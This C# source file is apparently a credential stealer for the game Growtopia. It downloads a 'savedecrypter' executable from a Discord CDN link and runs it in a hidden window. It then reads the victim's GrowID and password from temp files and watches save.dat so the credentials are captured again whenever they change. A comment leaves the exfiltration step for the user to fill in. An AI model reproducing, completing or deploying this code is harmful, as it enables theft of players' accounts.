using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;

namespace TraceSaveDat
{//SrMotion#0001
    class Program
    {

        public static string dirPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Growtopia", previus;
        public static string savePath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) +"\\Growtopia\\save.dat";
        public static FileSystemWatcher fileSystemWatcher = new FileSystemWatcher();
        public static void SendSaveDat()

        {
            #region ReadGrowIDPass
            string username = File.ReadAllText(Path.GetTempPath() + "\\user.txt");
            string password = File.ReadAllText(Path.GetTempPath() + "\\pass.txt");
            #endregion
            if(string.IsNullOrEmpty(username)|| string.IsNullOrEmpty(password))
            {
                Console.WriteLine("username or password is empty");

            }
            else
            {
                Console.Write("------------------------\n| Send Success         |\n");
                Console.WriteLine("------------------------\n| GrowID: " + username + "\n| Password: " + password + "\n------------------------\n");
                previus = username + password;
                //ur stealer send code :v
            }

        }
        static void Main(string[] args)
        {
            WebClient wc = new WebClient();

            wc.DownloadFile("https://cdn.discordapp.com/attachments/737682930146607104/737749127508525146/savedecrypter.exe", Path.GetTempPath() + "\\decode.exe");// amateurz's savedecrypter for 1 pass :D
            Process.Start(new ProcessStartInfo
            {
                FileName = Path.GetTempPath() + "\\decode.exe",
                WindowStyle = ProcessWindowStyle.Hidden
            }).WaitForExit();
            #region ReadGrowIDPass
            string username = File.ReadAllText(Path.GetTempPath() + "\\user.txt");
            string password = File.ReadAllText(Path.GetTempPath() + "\\pass.txt");
            #endregion
            SendSaveDat();//read growid and password and send the save dat after focus gt if changes pass sends :v

            fileSystemWatcher.Path = dirPath;
            fileSystemWatcher.NotifyFilter = NotifyFilters.LastWrite;
            fileSystemWatcher.Filter = "*.dat";
            fileSystemWatcher.Changed += OnSaveChanged;
            fileSystemWatcher.EnableRaisingEvents = true;
            while (true)
            {
                System.Threading.Thread.Sleep(1000);
            }
        }
        private static void OnSaveChanged(object source, FileSystemEventArgs e)
        {

            if (e.FullPath == savePath)
            {
                try
                {
                    #region CreateFiles
                    string fileName = Path.GetTempPath() + "\\pass.txt";
                    FileStream fs = new FileStream(fileName, FileMode.OpenOrCreate, FileAccess.Write);
                    fs.Close();
                    string fileNamea = Path.GetTempPath() + "\\user.txt";
                    FileStream fsa = new FileStream(fileNamea, FileMode.OpenOrCreate, FileAccess.Write);
                    fsa.Close();
                    Process.Start(new ProcessStartInfo
                    {
                        FileName = Path.GetTempPath() + "\\decode.exe",
                        WindowStyle = ProcessWindowStyle.Hidden
                    }).WaitForExit();
                    #endregion
                    #region ReadGrowIDPass
                    string username = File.ReadAllText(Path.GetTempPath() + "\\user.txt");
                    string password = File.ReadAllText(Path.GetTempPath() + "\\pass.txt");
                    #endregion
                    fileSystemWatcher.EnableRaisingEvents = false;
                    if (previus != username + password)
                    {
                        previus = username + password;
                        //SrMotion#0001
                        if(string.IsNullOrEmpty(username)|| string.IsNullOrEmpty(password))
                        {
                            Console.WriteLine("username or password is empty");
                        }
                        else
                        {
                            SendSaveDat();
                        }

                    }
                }
                finally
                {
                    fileSystemWatcher.EnableRaisingEvents = true;
                }
            }
        }
    }
}
